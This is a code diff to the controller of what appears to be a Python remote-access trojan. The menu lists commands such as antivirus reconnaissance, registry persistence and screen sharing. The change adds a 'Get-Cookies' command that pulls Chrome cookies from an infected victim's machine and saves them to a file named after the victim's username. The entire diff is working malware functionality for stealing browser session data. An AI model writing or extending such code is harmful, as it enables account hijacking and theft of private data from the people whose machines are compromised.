@@ -431,6 +431,7 @@ def target_communication(target, ip):
                     findfiles                          --> example findfiles|txt|C:\\
                     playsound                          --> play wav file in the background (just .wav)
                     av_recon                           --> Get Infos about Av
+                    Get-Cookies                        --> Grab Cookies From Chrome
                     persistence *RegName* *fileName*    --> Create Persistence In Registry'''))
             elif command[:11] == 'screenshare':
                 upload_file(target, 'scripts\\screenshare.ps1')
@@ -482,7 +483,12 @@ def target_communication(target, ip):
                         print("[-] Failed Uploading The File")
                     else:
                         print("[+] Wav File Started")
-
+            elif command[:11]== "Get-Cookies":
+                username = target.recv(1024).decode()
+                with open("Chrome-"+username+".txt",'w') as cookeis:
+                    cookeis.write(reliable_recv(target))
+                    cookeis.close()
+                print("Cookies Saved As Chrome-"+username+".txt")
             else:
                 result = reliable_recv(target)
                 print(result)
